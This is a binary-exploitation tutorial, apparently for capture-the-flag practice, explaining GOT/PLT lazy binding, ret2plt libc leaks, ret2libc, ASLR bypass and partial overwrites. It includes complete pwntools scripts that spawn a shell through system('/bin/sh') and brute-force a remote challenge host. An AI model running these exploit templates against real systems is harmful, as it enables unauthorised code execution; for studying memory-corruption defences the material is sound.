GOT/PLT Hijacking

Dynamic Linking Overview

When a binary uses shared libraries (libc, etc.), it doesn't embed every library function. Instead, it uses dynamic linking to resolve function addresses at runtime. Two key structures make this work:

  • PLT (Procedure Linkage Table) — executable code stubs in the .plt section. Each external function gets a PLT entry.
  • GOT (Global Offset Table) — writable data table in the .got.plt section. Stores the resolved runtime addresses of external functions.

Key Sections

SectionPermissionsPurpose
.pltr-xPLT stubs (trampoline code)
.gotr-- (Full RELRO) or rw-GOT for global variables
.got.pltrw- (Partial RELRO)GOT entries for PLT functions
.dynamicrw-Dynamic linker metadata

Lazy Binding Flow

By default, the dynamic linker uses lazy binding — functions are resolved only on first call.

First Call to puts()


# FIRST CALL — function not yet resolved
#
#  call puts@plt
#       |
#       v
#  +------------------+
#  | PLT[puts]        |   jmp *GOT[puts]     ; GOT initially points back to PLT+6
#  | push reloc_index |   push index          ; push relocation index
#  | jmp PLT[0]       |   jmp resolver        ; jump to dynamic linker
#  +------------------+
#       |
#       v
#  +------------------+
#  | _dl_runtime_resolve |  resolves puts() address in libc
#  |                      |  writes real address into GOT[puts]
#  |                      |  jumps to real puts()
#  +------------------+

Subsequent Calls to puts()


# SUBSEQUENT CALLS — function already resolved
#
#  call puts@plt
#       |
#       v
#  +------------------+
#  | PLT[puts]        |   jmp *GOT[puts]     ; GOT now contains real libc address
#  +------------------+
#       |
#       v
#  +------------------+
#  | libc: puts()     |   actual function executes directly
#  +------------------+

Examining PLT/GOT

# Disassemble PLT entry

# In GDB - after first call (resolved to libc)
gdb$ x/gx 0x601018     # GOT[puts] = 0x7ffff7a64e80 (libc puts)

ret2plt — Leaking Libc Addresses

The core technique: call puts@plt(GOT[puts]) to print the resolved libc address of puts. Since GOT[puts] contains the real runtime address after the first call, we can leak it.

Why This Works

  • PLT addresses are fixed (no PIE) or known (with PIE leak)
  • GOT addresses are fixed (no PIE) — we know where to read from
  • After first call, GOT contains real libc address
  • puts() prints bytes at the given address until null byte

x86-64 Calling Convention

; To call puts(GOT[puts]):
; RDI = first argument = address of GOT[puts]
;
; ROP chain:
;   pop rdi; ret          ; gadget to load RDI
;   GOT[puts]             ; address to leak
;   puts@plt              ; call puts with our argument
;   main                  ; return to main for stage 2

Complete ret2plt Leak

from pwn import *

elf = ELF('./vuln')
p = process('./vuln')
# p = remote('challenge.ctf.com', 1337)

# Gadgets
pop_rdi = 0x401233              # pop rdi; ret
ret = 0x40101a                  # ret (for stack alignment)

# Stage 1: Leak puts@libc
payload = b'A' * 72            # overflow to RIP
payload += p64(pop_rdi)
payload += p64(elf.got['puts']) # RDI = &GOT[puts]
payload += p64(elf.plt['puts']) # call puts(GOT[puts])
payload += p64(elf.sym['main']) # return to main

p.sendline(payload)
p.recvline()                    # consume any output before leak

# Parse leaked address
leak = u64(p.recvline().strip().ljust(8, b'\x00'))
log.info(f"puts@libc = {hex(leak)}")

ret2libc — Full Exploit

Once you have a libc leak, calculate libc base and call system("/bin/sh").

The Math

# libc_base = leaked_address - known_offset
# known_offset = offset of the leaked function within libc
#
# Example:
#   leaked puts = 0x7ffff7a64e80
#   libc puts offset = 0x80e80 (from: readelf -s libc.so.6 | grep puts)
#   libc_base = 0x7ffff7a64e80 - 0x80e80 = 0x7ffff79e4000
#
# Then:
#   system = libc_base + system_offset
#   binsh  = libc_base + binsh_offset

Full Two-Stage Exploit Template

from pwn import *

# Setup
binary = './vuln'
elf = ELF(binary)
libc = ELF('./libc.so.6')  # Use the EXACT libc from the target
# libc = elf.libc          # or auto-detect if available

context.binary = elf
context.log_level = 'info'

def conn():
    if args.REMOTE:
        return remote('challenge.ctf.com', 1337)
    return process(binary)

p = conn()

# Gadgets (find with: ROPgadget --binary vuln | grep "pop rdi")
pop_rdi = 0x401233    # pop rdi; ret
ret = 0x40101a        # ret (stack alignment for movaps)

# ============ STAGE 1: Leak libc ============
offset = 72           # padding to RIP (find with cyclic pattern)

payload1 = flat(
    b'A' * offset,
    pop_rdi,
    elf.got['puts'],
    elf.plt['puts'],
    elf.sym['main']     # loop back for stage 2
)

p.sendlineafter(b'> ', payload1)

# Parse leak - handle variable length due to null bytes
leak_raw = p.recvline().strip()
puts_leak = u64(leak_raw.ljust(8, b'\x00'))
log.success(f"puts leak: {hex(puts_leak)}")

# Calculate libc base
libc.address = puts_leak - libc.sym['puts']
log.success(f"libc base: {hex(libc.address)}")

# Verify alignment (libc base should end in 000)
assert libc.address & 0xfff == 0, "Bad libc base!"

# ============ STAGE 2: system("/bin/sh") ============
system = libc.sym['system']
binsh = next(libc.search(b'/bin/sh\x00'))

log.info(f"system: {hex(system)}")
log.info(f"/bin/sh: {hex(binsh)}")

payload2 = flat(
    b'A' * offset,
    ret,                # stack alignment (Ubuntu/modern glibc needs this)
    pop_rdi,
    binsh,
    system
)

p.sendlineafter(b'> ', payload2)
p.interactive()

GOT Overwrite

If you have an arbitrary write primitive (format string, heap overflow, etc.), you can overwrite a GOT entry to redirect execution.

ASLR Bypass Pattern

ASLR randomizes libc base each run, but the offsets within libc are constant. The standard bypass:

  1. Leak any libc address (via ret2plt or format string)
  2. Subtract known offset → libc base
  3. Add desired function offset → target address
# Pattern: leak → calculate → exploit
#
# ANY resolved GOT entry gives you libc base:
#   libc_base = leak - libc.sym['leaked_function']
#
# Common leak targets (in order of preference):
#   puts    - prints until null, most reliable
#   write   - prints exact number of bytes
#   printf  - can leak via format string
#   __libc_start_main - available even without other imports

# Multiple leak verification
puts_leak = leak_got(elf.got['puts'])
libc_base1 = puts_leak - libc.sym['puts']

setvbuf_leak = leak_got(elf.got['setvbuf'])
libc_base2 = setvbuf_leak - libc.sym['setvbuf']

assert libc_base1 == libc_base2, "Libc identification mismatch!"

With PIE, the base is random but the low 12 bits of any address are deterministic (page-aligned base). If the return address on the stack is 0x5555555551xx and you want to jump to 0x5555555552yy, overwriting just the low 1-2 bytes works without knowing the full address. For GOT entries, partial overwrites of the low 2 bytes can redirect to a different libc function (1/16 chance of correct 4th nibble with ASLR).

from pwn import *

elf = ELF('./partial_ow')

# Partial overwrite on return address
# Original return: main+0x4a (offset 0x114a in binary)
# Target: win function (offset 0x1200 in binary)
# Only need to overwrite low byte: 0x4a → 0x00 (1-byte write)
# But 0x00 is null! So overwrite low 2 bytes: write 0x1200

while True:
    try:
        p = remote('challenge.ctf', 9010)
        offset = 40
        payload = b'A' * offset
        payload += p16(0x1200)  # partial overwrite (low 2 bytes)
        p.sendafter(b'> ', payload)
        p.recvuntil(b'FLAG', timeout=1)
        log.success("Got it!")
        p.interactive()
    except:
        p.close()
